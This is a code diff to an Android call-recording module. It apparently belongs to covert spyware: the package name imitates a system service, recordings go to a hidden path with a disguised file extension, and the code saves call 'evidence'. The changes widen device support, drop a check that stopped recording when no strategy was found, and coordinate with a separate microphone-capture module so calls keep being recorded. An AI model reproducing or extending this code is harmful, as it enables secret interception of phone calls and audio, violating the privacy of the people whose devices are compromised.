@@ -10,8 +10,6 @@
 package com.android.service.module;
 
 import java.io.File;
-import java.io.IOException;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.concurrent.TimeUnit;
 
@@ -90,7 +88,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	public int notification(final Call call) {
-
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
 		}
@@ -126,25 +123,21 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 							saveCallEvidence(number, incoming, from, to, currentRecordFile);
 						}
 					}, 100, TimeUnit.MILLISECONDS);
+					
+					// Se un giorno la conf non dovesse includere gia' tutti i moduli,
+					// self() tornerebbe NULL in quanto non instanziato.
+					ModuleMic.self().resume();
 				}
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
 				}
-
+				
 				return 0;
 			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
-			}
-
-			if (strategy == 0) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (notification): no valid strategy found"); //$NON-NLS-1$
-				}
-
-				return 0;
 			}
 
 			int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
@@ -156,6 +149,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			// Logfile .3gpp in chiaro, temporaneo
 			String path = Path.hidden() + "/" + tmp + ".qzt";
 
+			ModuleMic.self().suspend();
+			
 			if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
@@ -163,6 +158,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				return 1;
 			}
+			
+			ModuleMic.self().resume();
 		}
 
 		saveCalllistEvidence(number, incoming, from, to);
@@ -320,6 +317,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		model = Build.MODEL.toLowerCase();
 		boolean supported = false;
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
+		}
+		
 		if (model.contains("i9100")) {
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
@@ -329,22 +330,31 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		} else if (model.contains("galaxy nexus")){
 			supported = true;
-			strategy = MediaRecorder.AudioSource.MIC;
+			//strategy = MediaRecorder.AudioSource.MIC;
+			strategy = MediaRecorder.AudioSource.DEFAULT;
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
+			}
+		}  else if (model.contains("gt-i9300")){ // Galaxy S3
+			supported = true;
+			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
+			}
+		}  else if (model.contains("xt910")){ // Motorola xt-910
+			supported = false;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
 			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
 			}
-			
-			// REMOVE
-			//strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 		}
 
-		// REMOVE
-		//supported = true;
 		return supported;
 	}
 
